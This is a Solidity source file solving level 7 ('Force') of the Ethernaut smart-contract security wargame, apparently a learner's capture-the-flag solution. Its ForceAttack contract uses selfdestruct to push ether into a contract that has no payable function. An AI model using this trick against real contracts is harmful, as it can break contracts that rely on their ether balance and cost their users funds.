// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/**
 * Used to solve level 7 (force) in Ethernaut. 
 * This is one of the simple problems, as long as you know the selfdestruct trick. Does
 * not warrant a 5/10 on the difficulty scale.
*/
contract ForceAttack {
    constructor() payable public {
    }

    // kills the cat
    function suicideBomber(address payable force) public  {
        selfdestruct(force);
    }
}

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}